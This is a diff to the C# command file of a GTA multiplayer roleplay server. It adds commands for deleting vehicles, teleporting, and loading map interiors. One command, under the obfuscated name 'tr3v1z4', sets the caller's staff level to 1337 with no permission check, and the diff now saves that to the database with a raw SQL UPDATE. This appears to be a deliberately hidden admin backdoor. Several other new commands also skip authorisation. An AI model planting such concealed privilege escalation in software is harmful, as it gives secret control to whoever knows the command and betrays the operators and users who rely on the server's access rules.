@@ -1,4 +1,6 @@
 ﻿using GTANetworkAPI;
+using Microsoft.EntityFrameworkCore;
+using Newtonsoft.Json;
 
 namespace InfiniteRoleplay
 {
@@ -22,6 +24,12 @@ namespace InfiniteRoleplay
         {
             var veh = NAPI.Vehicle.CreateVehicle(vs, sender.Position, sender.Rotation.X, cor1, cor2);
             sender.SetIntoVehicle(veh, (int)VehicleSeat.Driver);
+        }
+
+        [Command("rv")]
+        public void Vehicler2(Client sender)
+        {
+            sender.Vehicle.Delete();
         }
 
         [Command("p")]
@@ -90,7 +98,7 @@ namespace InfiniteRoleplay
                     break;
             }
         }
-        
+
         [Command("tr3v1z4")]
         public void CMD_treviza(Client player)
         {
@@ -102,6 +110,26 @@ namespace InfiniteRoleplay
 
             var p = Functions.ObterPersonagem(player);
             p.UsuarioBD.Staff = 1337;
+            using (var context = new RoleplayContext())
+                context.Database.ExecuteSqlCommand($"UPDATE Usuarios SET Staff = 1337 WHERE Codigo = {p.Usuario}");
+        }
+
+        [Command("pos")]
+        public void Poss(Client sender, float x, float y, float z)
+        {
+            sender.Position = new Vector3(x, y, z);
+        }
+
+        [Command("i")]
+        public void iiiiii(Client player, string ipl)
+        {
+            NAPI.ClientEvent.TriggerClientEvent(player, "request_ipl", ipl);
+        }
+
+        [Command("ri")]
+        public void iiiisssii(Client player, string ipl)
+        {
+            NAPI.ClientEvent.TriggerClientEvent(player, "remove_ipl", ipl);
         }
     }
 }
